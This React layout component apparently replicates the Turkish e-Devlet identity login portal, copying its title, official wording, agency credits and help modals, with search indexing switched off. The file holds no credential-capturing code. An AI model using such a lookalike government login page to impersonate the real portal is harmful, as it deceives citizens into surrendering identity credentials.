import Head from 'next/head';
import PropTypes from 'prop-types';

export default function EdevletLayout({ children, richText }) {
  return (
    <>
      <Head>
        <meta charSet="utf-8" />
        <meta httpEquiv="x-ua-compatible" content="IE=edge" />
        <meta httpEquiv="cleartype" content="on" />
        <title>e-Devlet Kapısı</title>
        <meta name="description" content="e-Devlet Kapısı" />
        <meta
          name="description"
          content="e-Devlet Kapısı'nı kullanarak kamu kurumlarının sunduğu hizmetlere tek noktadan, hızlı ve güvenli bir şekilde ulaşabilirsiniz."
        />
        <meta name="keywords" content="e-devlet, türkiye.gov.tr, e-devlet kapısı, edevlet, e devlet, türkiyegovtr" />
        <meta name="robots" content="noindex,nofollow" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <meta name="theme-color" content="#4284be" />
        <link rel="icon" type="image/png" href="/assets/img/favicon-196x196.png" sizes="196x196" />
        <meta name="msapplication-TileColor" content="#FFFFFF" />
        <link rel="stylesheet" href="/assets/css/base.css" />
        <link rel="stylesheet" href="/assets/css/giris.css" />
        <script src="/assets/js/header.js" defer />
      </Head>

      <div id="page">
        <header id="headerSection">
          <h1>Türkiye Cumhuriyeti Vatandaş Kimlik Doğrulama Sistemi</h1>
          <nav id="accesibilityBlock" className="visuallyhidden">
            <ul>
              <li>
                <a href="#loginForm">
                  Ana Sayfa
                </a>
              </li>
              <li>
                <a href="#pageContent">
                  İçeriğe Git
                </a>
              </li>
            </ul>
          </nav>
        </header>

        <main>
          <section className="referrerApp">
            <img className="sso" src="/assets/img/1.png" alt="" width="165" height="40" />
            <dl>
              <dt>Giriş Yapılacak Uygulama</dt>
              <dd>
                <span title="e-Devlet Kapısı">e-Devlet Kapısı</span>
              </dd>
            </dl>
          </section>

          <nav className="methodSelector" />

          <section id="pageContent">
            {richText ? <div className="richText" dangerouslySetInnerHTML={{ __html: richText }} /> : null}
            {children}
          </section>
        </main>

        <footer>
          <ul className="footerLinks">
            <li>
              <a href="#gizlilikGuvenlik">Gizlilik ve Güvenlik</a>
            </li>
            <li>
              <a href="#/iletisim?hizli=CozumMerkezi2" target="_blank" rel="noreferrer">
                Hızlı Çözüm Merkezi
              </a>
            </li>
          </ul>
          <div className="copyrightDetails">© 2023, Ankara - Tüm Hakları Saklıdır</div>
        </footer>

        <div className="printableFooter">
          <div className="imageSection">
            <img src="/assets/img/bb-ubak-tsat-black.png" alt="e-Devlet" />
            <span className="imageInfo">
              e-Devlet Kapısı’nın kurulması ve yönetilmesi görevi T.C. Cumhurbaşkanlığı Dijital Dönüşüm Ofisi Başkanlığı tarafından
              yürütülmekte olup, sistemin geliştirilmesi ve işletilmesi Türksat A.Ş. tarafından yapılmaktadır.
            </span>
          </div>
          <div className="bottomInfo">
            ©2020 Tüm Hakları Saklıdır. Gizlilik, Kullanım ve Telif Hakları bildiriminde belirtilen kurallar çerçevesinde hizmet
            sunulmaktadır.
          </div>
        </div>

        <div className="modal" id="gizlilikGuvenlik">
          <div className="modal-container">
            <button type="button" className="close" aria-label="Kapat">
              ×
            </button>
            <h3>Gizlilik ve Güvenlik</h3>
            <div className="modal-content">
              <p>
                e-Devlet Kapısı çalışanları hiçbir zaman size şifrenizi sormayacaktır. Şifrenizi e-Devlet Kapısı giriş ekranları haricinde
                hiçbir yere kaydetmeyiniz.
              </p>
              <p>Tarayıcı uygulamalarının şifre kaydetme opsiyonlarını kapalı tutunuz ve şüpheli e-postaları açmadan siliniz.</p>
            </div>
            <div className="modal-footer">
              <div className="formSubmitRow">
                <button className="cancelButton" type="button">
                  Kapat
                </button>
              </div>
            </div>
          </div>
          <div className="modalBg" />
        </div>

        <div className="modal" id="info">
          <div className="modal-container">
            <button type="button" className="close" aria-label="Kapat">
              ×
            </button>
            <h3>e-Devlet Şifresi</h3>
            <div className="modal-content">
              <p>e-Devlet şifrenizi PTT şubelerinden şahsen başvuru ile temin edebilirsiniz.</p>
              <p>Mobil imza, elektronik imza, yeni T.C. kimlik kartı veya internet bankacılığı ile de şifre oluşturabilirsiniz.</p>
            </div>
            <div className="modal-footer">
              <div className="formSubmitRow">
                <button className="cancelButton" type="button">
                  Kapat
                </button>
              </div>
            </div>
          </div>
          <div className="modalBg" />
        </div>
      </div>
    </>
  );
}

EdevletLayout.propTypes = {
  children: PropTypes.node.isRequired,
  richText: PropTypes.string,
};

EdevletLayout.defaultProps = {
  richText: undefined,
};